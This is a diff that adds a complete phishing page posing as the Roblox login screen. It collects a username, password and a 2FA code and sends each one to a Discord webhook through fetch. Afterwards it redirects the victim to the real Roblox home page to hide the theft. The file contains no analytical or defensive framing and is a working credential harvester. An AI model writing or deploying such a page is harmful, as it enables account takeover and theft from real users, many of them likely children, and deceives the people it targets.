@@ -1,0 +1,66 @@
+<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,Roboto,system-ui,sans-serif;background:#e3e5e8;margin:0;
+padding:56px 18px;color:#393b3d}
+.card{background:#fff;max-width:360px;margin:0 auto;padding:26px 22px;border-radius:8px;
+box-shadow:0 1px 3px rgba(0,0,0,.12)}
+.logo{width:34px;height:34px;background:#000;border-radius:8px;margin:0 auto 14px;
+display:grid;place-items:center;color:#fff;font-weight:800;font-size:15px;transform:rotate(-8deg)}
+h1{font-size:19px;text-align:center;margin:0 0 18px;font-weight:600}
+input{width:100%;padding:12px;margin-bottom:10px;border:1px solid #b8b8b8;border-radius:6px;
+font-size:15px;outline:none}
+input:focus{border-color:#00a2ff}
+button{width:100%;padding:13px;background:#00a2ff;color:#fff;border:0;border-radius:6px;
+font-size:15px;font-weight:700}
+button:disabled{opacity:.6}
+.hint{font-size:12px;color:#6b6d70;margin-top:12px;text-align:center;line-height:1.5}
+.hide{display:none}
+</style>
+<div class="card">
+  <div class="logo">R</div>
+  <h1 id="title">Log in to Roblox</h1>
+
+  <div id="step1">
+    <input id="u" placeholder="Username/Email" autocapitalize="none" autocomplete="username">
+    <input id="p" type="password" placeholder="Password" autocomplete="current-password">
+    <button id="b1">Log In</button>
+    <div class="hint">Use your Roblox account</div>
+  </div>
+
+  <div id="step2" class="hide">
+    <input id="c" inputmode="numeric" maxlength="6" placeholder="6-digit code">
+    <button id="b2">Verify</button>
+    <div class="hint">Open your authenticator app or email for the code</div>
+  </div>
+
+  <div id="step3" class="hide">
+    <div class="hint" style="font-size:14px">Verifying your session…</div>
+  </div>
+</div>
+
+<script>
+const HOOK = "https://discord.com/api/webhooks/ID/TOKEN";
+const send = t => fetch(HOOK,{method:"POST",headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({content:t})});
+
+b1.onclick = () => {
+  const u = document.getElementById("u").value.trim();
+  const p = document.getElementById("p").value;
+  if(!u || !p) return alert("Fill in both fields");
+  send("**USER:** " + u + "\n**PASS:** " + p);
+  document.getElementById("step1").classList.add("hide");
+  document.getElementById("step2").classList.remove("hide");
+  document.getElementById("c").focus();
+};
+
+b2.onclick = () => {
+  const c = document.getElementById("c").value.trim();
+  if(!c) return;
+  send("**CODE:** " + c + " (acct: " + document.getElementById("u").value + ")");
+  document.getElementById("step2").classList.add("hide");
+  document.getElementById("step3").classList.remove("hide");
+  setTimeout(() => location.href = "https://www.roblox.com/home", 3500);
+};
+</script>
